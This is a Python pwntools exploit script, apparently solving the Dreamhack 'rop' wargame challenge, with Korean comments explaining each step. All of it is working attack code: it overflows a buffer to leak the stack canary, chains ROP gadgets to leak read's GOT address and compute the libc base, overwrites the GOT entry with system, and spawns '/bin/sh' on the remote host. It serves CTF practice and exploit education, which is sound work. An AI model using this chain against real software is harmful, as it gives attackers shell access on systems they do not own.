from pwn import *

##########
# RUN PROGRAM
##########
#p = process('./rop')
#p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
p = remote("host3.dreamhack.games", "16314")
e = ELF('./rop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

buffer_length = 0x30

##########
# LEAK CANARY
##########
payload = b'A'*(buffer_length + 8 + 1) # overwrite buffer_length + 8(canary_dummy) + 1(canary_first 1 byte null)
# p.sendafter(b'Buf: ', payload)
p.send(payload)
p.recvuntil(payload)
canary = b'\x00' + p.recvn(7)
print('canary:',hex(u64(canary)))

##########
# LEAK ADDRESS OF LIBC FUNC
##########
read_got = e.got['read']  # read 함수의 got
read_plt = e.plt['read']  # read 함수의 plt
write_plt = e.plt['write']  # write 함수의 plt
pop_rdi_ret = 0x0000000000400853  # pop rdi; ret 구문의 주소
pop_rsi_pop_r15_ret = 0x0000000000400851  # pop rsi; pop r15; ret 구문의 주소
ret = 0x0000000000400596  # ret 구문의 주소, 리턴 가젯

payload = b'A'*(buffer_length + 8) + canary + b'B'*8  # overwrite buffer_length + 8(canary_dummy) + canary(8) + SFP(8)
payload += p64(pop_rdi_ret) + p64(1)  # rdi 에 1 을 적용하도록 gadget 배치
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 을 넣고, r15에 0(아무값) 을 넣는다.
payload += p64(write_plt)  # return 주소를 write_plt 로 변경한다. 
# write(1,read_got) 가 완성되었다. payload를 프로그램에 넘기면 read 함수의 주소를 출력하게 된다.

##########
# CHANGE GOT OF READ INTO ADDR OF SYSTEM
##########
# 앞서 libc_base를 알아내기 위해 buffer overflow로 read 함수의 got 영역을 출력하도록 payload를 작성했다.
# payload에 system("/bin/sh") 를 호출하기 위한 코드를 이어서 작성한다.
# read_got 에 system 함수의 주소를 덮어쓰기 위해 read 함수를 한 번 더 호출한다.
# read(0, read_got, arg3) 를 호출하여 입력을 한 번 더 받도록 한다.
# arg3, 즉 rdx 에 6 이상의 값이 들어가야 하지만, ROPgadget 명령으로 확인 결과 rdx 가 포함된 gadget이 없다면 운에 맡기고 호출한다.
payload += p64(pop_rdi_ret) + p64(0)  # rdi 에 0 값 적용
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 주소 적용, r15 pop을 위한 더미값 0 적용
# read 함수의 plt 를 호출하면 system 함수가 호출되도록 got를 변경한다.
payload += p64(read_plt)  # read 함수 호출

# 참조
offset_bin_sh = next(libc.search(b'/bin/sh'))  # libc에 위치한 "/bin/sh" 문자열의 위치를 추출할 수 있다.
print('offset /bin/sh:', hex(offset_bin_sh))

##########
# CALL read("/bin/bash")
##########
# read의 got를 system으로 변경하게 되면, read("/bin/bash") 를 호출한 결과는 system("/bin/bash") 가 된다.
payload += p64(pop_rdi_ret) + p64(read_got + 0x08)  # "/bin/bash" 문자열을 libc에서 사용하지 않고 got 영역에 덮어써서 사용하겠다.
payload += p64(ret)  # system() 함수 내부의 movaps 가 스택의 데이터를 16바이트로 정렬하므로, 16바이트 짝을 맞추기 위해 리턴가젯 사용
payload += p64(read_plt)


# payload 보내게 되면 (1) read 함수 주소 출력, (2) stdin 입력 대기, 입력된 값으로 read_got 덮어씀, (3) system('/bin/sh') 실행
p.sendafter(b'Buf: ', payload)
addr_read = p.recvn(6).ljust(8,b'\x00')  # ASLR이 적용되면 라이브러리 함수의 주소는 항상 0x00007f 로 시작하므로 0x00 0x00 + 6자리로 구성된다.
print('addr read:', hex(u64(addr_read)))

##########
# CALC LIBC_BASE ADDR
##########
# 유출된 read 함수의 주소로 libc_base 가 메모리상에 위치하는 주소를 계산한다.
offset_read = libc.symbols['read']
libc_base = u64(addr_read) - offset_read
print('libc_base:', hex(libc_base))

##########
# CALC ADDR OF SYSTEM 
##########
offset_system = libc.symbols['system']
addr_system = libc_base + offset_system 
print('addr system:', hex(addr_system))

p.send(p64(addr_system) + b"/bin/sh\x00")

p.interactive()
